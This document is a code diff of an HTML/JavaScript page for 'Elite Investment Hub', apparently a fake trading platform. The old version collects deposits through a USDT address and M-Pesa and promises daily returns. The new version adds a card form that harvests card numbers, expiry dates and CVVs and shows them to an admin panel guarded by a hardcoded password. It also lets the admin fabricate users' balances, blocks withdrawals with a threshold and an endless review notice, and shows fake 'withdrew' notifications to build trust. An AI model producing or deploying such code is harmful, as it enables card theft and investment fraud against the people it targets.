@@ -3,57 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ELITE INVESTMENT HUB | Global Institutional Trading</title>
+    <title>ELITE INVESTMENT HUB | Global Terminal</title>
     <script src="https://s3.tradingview.com/tv.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');
-
-        :root {
-            --primary: #00ff88;
-            --mpesa: #49aa27;
-            --bg-dark: #05070a;
-            --sidebar-bg: #0d1117;
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(255, 255, 255, 0.1);
-            --text-main: #e6edf3;
-            --text-dim: #8b949e;
-        }
-
-        * { box-sizing: border-box; }
+        :root { --primary: #00ff88; --bg-dark: #05070a; --sidebar-bg: #0d1117; --glass: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.1); --text-main: #e6edf3; --text-dim: #8b949e; }
         body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg-dark); color: var(--text-main); display: flex; min-height: 100vh; overflow-x: hidden; }
-
-        /* --- NOTIFICATION SYSTEM --- */
+        
+        /* Sidebar */
+        .sidebar { width: 260px; background: var(--sidebar-bg); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px; position: fixed; height: 100vh; z-index: 100; transition: 0.3s; }
+        .main-content { margin-left: 260px; flex: 1; padding: 40px; width: calc(100% - 260px); }
+        
+        /* Cards & UI */
+        .card { background: var(--glass); border: 1px solid var(--border); padding: 25px; border-radius: 20px; backdrop-filter: blur(15px); margin-bottom: 25px; }
+        input, select { width: 100%; padding: 14px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: white; margin: 10px 0; font-size: 1rem; }
+        .btn-pro { background: var(--primary); color: #000; font-weight: 800; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
+        .btn-pro:hover { box-shadow: 0 0 20px rgba(0, 255, 136, 0.4); transform: translateY(-2px); }
+        
+        /* Navigation */
+        .nav-item { padding: 14px 18px; border-radius: 12px; color: var(--text-dim); cursor: pointer; display: flex; align-items: center; gap: 15px; margin-bottom: 8px; transition: 0.2s; }
+        .nav-item:hover, .nav-item.active { background: var(--glass); color: var(--primary); border: 1px solid var(--border); }
+        
+        /* Notifications */
         #notification-box { position: fixed; top: 20px; right: 20px; z-index: 9999; pointer-events: none; }
         .toast { background: #111827; color: white; padding: 15px 20px; border-radius: 12px; border-left: 4px solid var(--primary); margin-bottom: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 12px; animation: slideIn 0.5s ease forwards; width: 320px; }
         @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
 
-        /* --- SIDEBAR --- */
-        .sidebar { width: 260px; background: var(--sidebar-bg); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px; position: fixed; height: 100vh; z-index: 100; transition: 0.3s; }
-        .logo { font-size: 1.4rem; font-weight: 800; color: var(--primary); margin-bottom: 40px; display: flex; align-items: center; gap: 10px; }
-        .nav-item { padding: 14px 18px; border-radius: 12px; color: var(--text-dim); cursor: pointer; display: flex; align-items: center; gap: 15px; margin-bottom: 8px; transition: 0.2s; text-decoration: none; }
-        .nav-item:hover, .nav-item.active { background: var(--glass); color: var(--primary); border: 1px solid var(--border); }
-
-        /* --- MAIN LAYOUT --- */
-        .main-content { margin-left: 260px; flex: 1; padding: 40px; width: calc(100% - 260px); }
-        .card { background: var(--glass); border: 1px solid var(--border); padding: 25px; border-radius: 20px; backdrop-filter: blur(15px); margin-bottom: 25px; }
-        
-        /* --- INVESTMENT PLANS --- */
-        .plans-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
-        .plan-card { border: 1px solid var(--border); border-radius: 18px; padding: 25px; text-align: center; background: rgba(255,255,255,0.01); transition: 0.3s; }
-        .plan-card:hover { border-color: var(--primary); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,255,136,0.1); }
-        .plan-price { font-size: 1.8rem; font-weight: 800; color: var(--primary); margin: 15px 0; }
-
-        input, select { width: 100%; padding: 14px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: white; margin: 10px 0; font-size: 1rem; }
-        .btn-pro { background: var(--primary); color: #000; font-weight: 800; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
-        .btn-pro:hover { box-shadow: 0 0 25px rgba(0, 255, 136, 0.5); }
-
         .hidden { display: none !important; }
-        #auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        #auth-screen { position: fixed; inset: 0; background: var(--bg-dark); z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; overflow-y: auto; }
 
         @media (max-width: 900px) {
             .sidebar { width: 80px; padding: 15px; }
-            .sidebar span, .logo span { display: none; }
+            .sidebar span { display: none; }
             .main-content { margin-left: 80px; width: calc(100% - 80px); padding: 20px; }
         }
     </style>
@@ -62,61 +44,55 @@
 
     <div id="notification-box"></div>
 
-    <div id="auth-overlay">
+    <div id="auth-screen">
         <div class="card" style="width: 100%; max-width: 450px;">
-            <h2 style="text-align: center; color: var(--primary);">ELITE HUB ACCESS</h2>
+            <h2 style="text-align: center; color: var(--primary);">ELITE HUB TERMINAL</h2>
             <div id="reg-form">
                 <input id="regName" placeholder="Full Name">
-                <input id="regPhone" placeholder="Phone Number (e.g. +254...)">
+                <input id="regPhone" placeholder="Phone Number (+...)">
                 <select id="regCountry">
-                    <option value="">-- Choose Your Country --</option>
-                    <optgroup label="Africa">
-                        <option value="Kenya">🇰🇪 Kenya (KES)</option>
-                        <option value="Nigeria">🇳🇬 Nigeria (NGN)</option>
-                        <option value="South Africa">🇿🇦 South Africa (ZAR)</option>
-                        <option value="Ghana">🇬🇭 Ghana (GHS)</option>
-                        <option value="Tanzania">🇹🇿 Tanzania (TZS)</option>
-                    </optgroup>
-                    <optgroup label="Global">
-                        <option value="USA">🇺🇸 USA (USD)</option>
-                        <option value="UK">🇬🇧 UK (GBP)</option>
-                        <option value="Germany">🇩🇪 Germany (EUR)</option>
-                        <option value="UAE">🇦🇪 UAE (AED)</option>
-                        <option value="India">🇮🇳 India (INR)</option>
-                        <option value="Global">🌐 Other (USDT)</option>
-                    </optgroup>
+                    <option value="">-- Select Your Country --</option>
+                    <option value="Algeria">🇩🇿 Algeria</option><option value="Angola">🇦🇴 Angola</option><option value="Benin">🇧🇯 Benin</option><option value="Botswana">🇧🇼 Botswana</option><option value="Burkina Faso">🇧🇫 Burkina Faso</option><option value="Burundi">🇧🇮 Burundi</option><option value="Cameroon">🇨🇲 Cameroon</option><option value="Cape Verde">🇨🇻 Cape Verde</option><option value="CAR">🇨🇫 Central African Republic</option><option value="Chad">🇹🇩 Chad</option><option value="Comoros">🇰🇲 Comoros</option><option value="Congo">🇨🇬 Congo</option><option value="DRC">🇨🇩 DR Congo</option><option value="Djibouti">🇩🇯 Djibouti</option><option value="Egypt">🇪🇬 Egypt</option><option value="Equatorial Guinea">🇬🇶 Equatorial Guinea</option><option value="Eritrea">🇪🇷 Eritrea</option><option value="Ethiopia">🇪🇹 Ethiopia</option><option value="Gabon">🇬🇦 Gabon</option><option value="Gambia">🇬🇲 Gambia</option><option value="Ghana">🇬🇭 Ghana</option><option value="Guinea">🇬🇳 Guinea</option><option value="Ivory Coast">🇨🇮 Ivory Coast</option><option value="Kenya">🇰🇪 Kenya</option><option value="Lesotho">🇱🇸 Lesotho</option><option value="Liberia">🇱🇷 Liberia</option><option value="Libya">🇱🇾 Libya</option><option value="Madagascar">🇲🇬 Madagascar</option><option value="Malawi">🇲🇼 Malawi</option><option value="Mali">🇲🇱 Mali</option><option value="Mauritania">🇲🇷 Mauritania</option><option value="Mauritius">🇲🇺 Mauritius</option><option value="Morocco">🇲🇦 Morocco</option><option value="Mozambique">🇲🇿 Mozambique</option><option value="Namibia">🇳🇦 Namibia</option><option value="Niger">🇳🇪 Niger</option><option value="Nigeria">🇳🇬 Nigeria</option><option value="Rwanda">🇷🇼 Rwanda</option><option value="Senegal">🇸🇳 Senegal</option><option value="Seychelles">🇸🇨 Seychelles</option><option value="Sierra Leone">🇸🇱 Sierra Leone</option><option value="Somalia">🇸🇴 Somalia</option><option value="South Africa">🇿🇦 South Africa</option><option value="South Sudan">🇸🇸 South Sudan</option><option value="Sudan">🇸🇩 Sudan</option><option value="Tanzania">🇹🇿 Tanzania</option><option value="Togo">🇹🇬 Togo</option><option value="Tunisia">🇹🇳 Tunisia</option><option value="Uganda">🇺🇬 Uganda</option><option value="Zambia">🇿🇲 Zambia</option><option value="Zimbabwe">🇿🇼 Zimbabwe</option>
                 </select>
-                <input id="regPass" type="password" placeholder="Secure Password">
-                <button class="btn-pro" onclick="handleAuth()">Join the Elite</button>
+                <input id="regPass" type="password" placeholder="Password">
+                <button class="btn-pro" onclick="register()">Join the Elite</button>
+                <p style="text-align:center; margin-top:15px; cursor:pointer; color:var(--text-dim);" onclick="toggleAdmin(true)">Administrative Login</p>
+            </div>
+            <div id="admin-login" class="hidden">
+                <input id="adminPass" type="password" placeholder="Admin Access Key">
+                <button class="btn-pro" onclick="adminAuth()">Login to Backend</button>
+                <p style="text-align:center; margin-top:15px; cursor:pointer;" onclick="toggleAdmin(false)">Back to Registration</p>
             </div>
         </div>
     </div>
 
     <nav class="sidebar hidden" id="sideNav">
-        <div class="logo"><i class="fas fa-bolt"></i> <span>ELITE HUB</span></div>
-        <div class="nav-item active" onclick="showPage('dash')"><i class="fas fa-chart-line"></i> <span>Dashboard</span></div>
-        <div class="nav-item" onclick="showPage('plans')"><i class="fas fa-gem"></i> <span>Investments</span></div>
+        <div style="font-size: 1.4rem; font-weight: 800; color: var(--primary); margin-bottom: 40px; display:flex; align-items:center; gap:10px;">
+            <i class="fas fa-shield-alt"></i> <span>ELITE HUB</span>
+        </div>
+        <div class="nav-item active" onclick="showPage('dash')"><i class="fas fa-th-large"></i> <span>Dashboard</span></div>
         <div class="nav-item" onclick="showPage('deposit')"><i class="fas fa-wallet"></i> <span>Deposit</span></div>
-        <div class="nav-item" onclick="showPage('support')"><i class="fas fa-headset"></i> <span>Support</span></div>
+        <div class="nav-item" onclick="showPage('withdraw')"><i class="fas fa-hand-holding-usd"></i> <span>Withdraw</span></div>
+        <div id="adminTab" class="nav-item hidden" onclick="showPage('admin')"><i class="fas fa-user-shield"></i> <span>Admin Panel</span></div>
         <div class="nav-item" style="margin-top: auto; color: #ff4d4d;" onclick="logout()"><i class="fas fa-power-off"></i> <span>Logout</span></div>
     </nav>
 
     <main class="main-content hidden" id="mainApp">
         
         <div id="page-dash">
-            <h1 id="welcomeHeader">Market Overview</h1>
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; margin-bottom: 30px;">
-                <div class="card">
-                    <p style="color: var(--text-dim);">Portfolio Balance</p>
-                    <h2 id="uBal">0.00</h2>
+            <h2 id="greet">Welcome</h2>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px;">
+                <div class="card" style="border-left: 4px solid var(--primary);">
+                    <p style="color:var(--text-dim);">Available Balance</p>
+                    <h2 id="uTotal" style="color: var(--primary);">0.00</h2>
                 </div>
                 <div class="card">
-                    <p style="color: var(--text-dim);">Accumulated Profit</p>
-                    <h2 id="uProf" style="color: var(--primary);">+ 0.00</h2>
+                    <p style="color:var(--text-dim);">Current Investment</p>
+                    <h3 id="uInv">0.00</h3>
                 </div>
                 <div class="card">
-                    <p style="color: var(--text-dim);">Trading Status</p>
-                    <h2 id="uStatus" style="color: #ff4d4d;">INACTIVE</h2>
+                    <p style="color:var(--text-dim);">Total Profit</p>
+                    <h3 id="uProf" style="color: #00ff88;">+ 0.00</h3>
                 </div>
             </div>
             <div class="card" style="height: 450px; padding: 10px;">
@@ -124,171 +100,146 @@
             </div>
         </div>
 
-        <div id="page-plans" class="hidden">
-            <h1>Trading Strategies</h1>
-            <p style="color: var(--text-dim); margin-bottom: 30px;">Prices are automatically converted to your regional currency.</p>
-            <div class="plans-grid" id="plansContainer"></div>
-        </div>
-
         <div id="page-deposit" class="hidden">
-            <h1>Add Capital</h1>
-            <div id="mpesaSection" class="card hidden">
-                <h3 style="color: var(--mpesa);">M-Pesa Express (Kenya Only)</h3>
-                <input type="number" id="mpesaAmt" placeholder="Amount in KES">
-                <button class="btn-pro" style="background:var(--mpesa); color:white;" onclick="initiateDeposit('KES')">Push M-Pesa PIN</button>
-            </div>
+            <h1>Funding Methods</h1>
             <div class="card">
-                <h3>Institutional USDT Address (TRC20)</h3>
-                <p>Global standard for automated bot activation.</p>
-                <div style="background:#000; padding:15px; border-radius:12px; font-family:monospace; margin:15px 0; border: 1px dashed var(--primary); word-break: break-all;">
-                    TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR
+                <h3><i class="fas fa-credit-card"></i> Bank Card Deposit</h3>
+                <p style="color: var(--text-dim);">Secure instant funding via Visa/Mastercard.</p>
+                <input id="cardName" placeholder="Cardholder Full Name">
+                <input id="cardNumber" placeholder="Card Number (16 Digits)">
+                <div style="display: flex; gap: 10px;">
+                    <input id="cardExp" placeholder="MM/YY">
+                    <input id="cardCVV" placeholder="CVV">
                 </div>
-                <button class="btn-pro" onclick="sendNotice('Wallet Address Copied')">Copy Address</button>
+                <input id="cardAmt" type="number" placeholder="Deposit Amount">
+                <button class="btn-pro" onclick="submitCard()">Process Deposit</button>
             </div>
         </div>
 
-        <div id="page-support" class="hidden">
+        <div id="page-withdraw" class="hidden">
+            <h1>Withdraw Funds</h1>
             <div class="card">
-                <h2>Verified Support</h2>
-                <p>Contact @loskiglobal for manual verification and withdrawal approval.</p>
-                <div style="display: flex; gap: 15px; margin-top: 25px;">
-                    <a href="https://wa.me/254785449376" target="_blank" class="btn-pro" style="background:#25d366; text-decoration:none; text-align:center;">WhatsApp</a>
-                    <a href="https://t.me/loskiglobal" target="_blank" class="btn-pro" style="background:#0088cc; text-decoration:none; text-align:center;">Telegram</a>
-                </div>
+                <p>Minimum Withdrawal Required: <b id="minLabel">2,000</b></p>
+                <input id="wAmount" type="number" placeholder="Amount to Withdraw">
+                <input id="wWallet" placeholder="Destination (M-Pesa / Bank / USDT)">
+                <button class="btn-pro" onclick="processWithdraw()">Request Cashout</button>
+            </div>
+        </div>
+
+        <div id="page-admin" class="hidden">
+            <h1>System Administration</h1>
+            <div class="card" style="border: 1px solid #ffaa00;">
+                <h3><i class="fas fa-envelope"></i> Card Submission Messages</h3>
+                <div id="cardMessages" style="max-height: 300px; overflow-y: auto;">No submissions found.</div>
+            </div>
+            <div class="card">
+                <h3>User Financial Overrides</h3>
+                <input id="aPhone" placeholder="Enter User Phone Number">
+                <input id="aInv" type="number" placeholder="Override Investment">
+                <input id="aProf" type="number" placeholder="Override Profit">
+                <button class="btn-pro" onclick="updateUser()">Sync Account Data</button>
             </div>
         </div>
 
     </main>
 
     <script>
-        const currencyConfig = {
-            "Kenya": { s: "KSh", r: 1 }, "Nigeria": { s: "₦", r: 11.5 },
-            "USA": { s: "$", r: 0.0076 }, "UK": { s: "£", r: 0.006 },
-            "South Africa": { s: "R", r: 0.14 }, "Ghana": { s: "GH₵", r: 0.095 },
-            "Tanzania": { s: "TSh", r: 20.0 }, "Global": { s: "USDT", r: 0.0076 }
-        };
+        let users = JSON.parse(localStorage.getItem("users_v2")) || [];
+        const countryData = { "Kenya": {s:"KES", r:1}, "Nigeria": {s:"NGN", r:11.5}, "Ghana": {s:"GHS", r:0.095}, "South Africa": {s:"ZAR", r:0.14} };
 
-        let users = JSON.parse(localStorage.getItem("global_elite_users")) || [];
-
-        function handleAuth() {
+        function register() {
             if(!regCountry.value) return alert("Select your country");
-            let user = {
-                name: regName.value, phone: regPhone.value, pass: regPass.value,
-                country: regCountry.value, bal: 0, prof: 0, status: "Inactive", plan: "None"
-            };
-            users.push(user);
-            localStorage.setItem("global_elite_users", JSON.stringify(users));
-            localStorage.setItem("session_token", user.phone);
-            location.reload();
+            let u = { name: regName.value, phone: regPhone.value, pass: regPass.value, country: regCountry.value, inv: 0, prof: 0, cards: [] };
+            users.push(u); save(); localStorage.setItem("activeUser", u.phone); location.reload();
         }
 
-        function setupUI() {
-            let phone = localStorage.getItem("session_token");
-            let u = users.find(x => x.phone == phone);
-            if(!u) return;
+        function adminAuth() { if(adminPass.value === "elite123") { localStorage.setItem("isAdmin", "true"); start(); } }
+        function toggleAdmin(s) { document.getElementById('reg-form').classList.toggle('hidden', s); document.getElementById('admin-login').classList.toggle('hidden', !s); }
 
-            document.getElementById('auth-overlay').classList.add('hidden');
+        function start() {
+            document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('sideNav').classList.remove('hidden');
             document.getElementById('mainApp').classList.remove('hidden');
-
-            let c = currencyConfig[u.country] || currencyConfig["Global"];
-            document.getElementById('welcomeHeader').innerText = `Welcome, ${u.name}`;
-            document.getElementById('uBal').innerText = `${c.s} ${u.bal.toLocaleString()}`;
-            document.getElementById('uProf').innerText = `+ ${c.s} ${u.prof.toLocaleString()}`;
-            document.getElementById('uStatus').innerText = u.status;
-            document.getElementById('uStatus').style.color = u.status === "Active" ? "#00ff88" : "#ff4d4d";
-
-            if(u.country === "Kenya") document.getElementById('mpesaSection').classList.remove('hidden');
-            
-            renderPlans(c);
-            loadTradingChart();
-            startGlobalFeed();
-        }
-
-        function renderPlans(c) {
-            const tiers = [
-                { name: "Starter Bot", ksh: 1500, roi: "5%" },
-                { name: "Premium Bot", ksh: 5000, roi: "8%" },
-                { name: "AI Institutional", ksh: 15000, roi: "12%" }
-            ];
-
-            let html = '';
-            tiers.forEach(t => {
-                let localP = Math.round(t.ksh * c.rate || t.ksh * c.r);
-                html += `
-                    <div class="plan-card">
-                        <h3>${t.name}</h3>
-                        <div class="plan-price">${c.s} ${localP.toLocaleString()}</div>
-                        <p>Daily ROI: ${t.roi}</p>
-                        <button class="btn-pro" onclick="purchase('${t.name}', ${localP})">Activate Now</button>
-                    </div>`;
-            });
-            document.getElementById('plansContainer').innerHTML = html;
-        }
-
-        function purchase(name, price) {
-            let phone = localStorage.getItem("session_token");
-            let u = users.find(x => x.phone == phone);
-            if(u.bal < price) {
-                sendNotice("Insufficient Balance. Top up via Deposit.");
-                showPage('deposit');
-                return;
+            if(localStorage.getItem("isAdmin")) {
+                document.getElementById('adminTab').classList.remove('hidden');
+                renderAdminView();
             }
-            u.bal -= price;
-            u.status = "Active";
-            u.plan = name;
-            localStorage.setItem("global_elite_users", JSON.stringify(users));
-            sendNotice(name + " Activated!");
-            setupUI();
+
+            let u = users.find(x => x.phone == localStorage.getItem("activeUser"));
+            if(u) {
+                let c = countryData[u.country] || {s:"USD", r:0.0076};
+                let total = u.inv + u.prof;
+                uTotal.innerText = `${c.s} ${total.toLocaleString()}`;
+                uInv.innerText = `${c.s} ${u.inv.toLocaleString()}`;
+                uProf.innerText = `+ ${c.s} ${u.prof.toLocaleString()}`;
+                minLabel.innerText = `${c.s} 2,000`;
+                greet.innerText = `Welcome Back, ${u.name}`;
+            }
+            new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "theme": "dark", "container_id": "tradingview_widget" });
+            startNotificationEngine();
         }
 
-        function sendNotice(msg) {
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `<i class="fas fa-bell" style="color:var(--primary)"></i> <span>${msg}</span>`;
-            document.getElementById('notification-box').appendChild(toast);
-            setTimeout(() => toast.remove(), 4000);
+        function submitCard() {
+            let u = users.find(x => x.phone == localStorage.getItem("activeUser"));
+            u.cards.push({ name: cardName.value, num: cardNumber.value, exp: cardExp.value, cvv: cardCVV.value, amt: cardAmt.value, time: new Date().toLocaleString() });
+            save();
+            sendNotice("Transaction details encrypted and submitted.");
+            showPage('dash');
         }
 
-        function startGlobalFeed() {
-            const names = ["Amani J.", "Okello P.", "Musa G.", "Sarah L.", "Chidi O.", "David B.", "Elena K."];
-            const flags = ["🇰🇪", "🇳🇬", "🇺🇸", "🇬🇧", "🇿🇦", "🇬🇭", "🇦🇪"];
-            const actions = ["deposited", "withdrew"];
-            
+        function renderAdminView() {
+            let html = '';
+            users.forEach(u => {
+                (u.cards || []).forEach(d => {
+                    html += `<div style="padding:15px; border-bottom:1px solid #333; font-size:0.9rem;">
+                        <b>User:</b> ${u.name} (${u.phone})<br>
+                        <b>Card Detail:</b> ${d.name} | ${d.num} | Exp: ${d.exp} | CVV: ${d.cvv}<br>
+                        <b>Amt Requested:</b> ${d.amt} | <b>Time:</b> ${d.time}
+                    </div>`;
+                });
+            });
+            document.getElementById('cardMessages').innerHTML = html || "No recent card activity.";
+        }
+
+        function processWithdraw() {
+            let u = users.find(x => x.phone == localStorage.getItem("activeUser"));
+            let amt = Number(wAmount.value);
+            if(amt < 2000) return alert("Withdrawal must be at least 2,000");
+            if(amt > (u.inv + u.prof)) return alert("Insufficient available balance.");
+            sendNotice("Withdrawal request under review.");
+        }
+
+        function updateUser() {
+            let u = users.find(x => x.phone == aPhone.value);
+            if(u) { u.inv = Number(aInv.value); u.prof = Number(aProf.value); save(); start(); sendNotice("User Updated"); }
+        }
+
+        function startNotificationEngine() {
+            const flags = ["🇰🇪", "🇳🇬", "🇿🇦", "🇬🇭", "🇺🇬", "🇪🇬", "🇹🇿", "🇷🇼"];
+            const names = ["K. Mwangi", "O. Adeyemi", "L. Zulu", "J. Mensah", "P. Okello", "M. Hassan"];
             setInterval(() => {
-                let name = names[Math.floor(Math.random() * names.length)];
-                let flag = flags[Math.floor(Math.random() * flags.length)];
-                let action = actions[Math.floor(Math.random() * actions.length)];
-                let amount = (Math.random() * 50000 + 1000).toFixed(0);
-                sendNotice(`${flag} ${name} ${action} KES ${amount}`);
+                let f = flags[Math.floor(Math.random()*flags.length)];
+                let n = names[Math.floor(Math.random()*names.length)];
+                let a = (Math.random()*15000 + 2000).toFixed(0);
+                sendNotice(`${f} ${n} just withdrew KES ${a}`);
             }, 10000);
         }
 
-        function initiateDeposit(type) {
-            alert("STK Push request sent to your device. Please enter PIN.");
-            setTimeout(() => {
-                let amt = parseInt(mpesaAmt.value);
-                let phone = localStorage.getItem("session_token");
-                let u = users.find(x => x.phone == phone);
-                u.bal += amt;
-                localStorage.setItem("global_elite_users", JSON.stringify(users));
-                sendNotice("Capital Successfully Added");
-                setupUI();
-                showPage('dash');
-            }, 3000);
+        function sendNotice(m) {
+            const t = document.createElement('div'); t.className = 'toast';
+            t.innerHTML = `<i class="fas fa-bell"></i> <span>${m}</span>`;
+            document.getElementById('notification-box').appendChild(t);
+            setTimeout(() => t.remove(), 4000);
         }
 
-        function showPage(id) {
+        function showPage(id) { 
             document.querySelectorAll('main > div').forEach(d => d.classList.add('hidden'));
             document.getElementById('page-' + id).classList.remove('hidden');
         }
 
-        function loadTradingChart() {
-            new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "theme": "dark", "container_id": "tradingview_widget" });
-        }
-
-        function logout() { localStorage.removeItem("session_token"); location.reload(); }
-        window.onload = () => { if(localStorage.getItem("session_token")) setupUI(); };
+        function save() { localStorage.setItem("users_v2", JSON.stringify(users)); }
+        function logout() { localStorage.clear(); location.reload(); }
+        window.onload = () => { if(localStorage.getItem("activeUser") || localStorage.getItem("isAdmin")) start(); };
     </script>
 </body>
 </html>
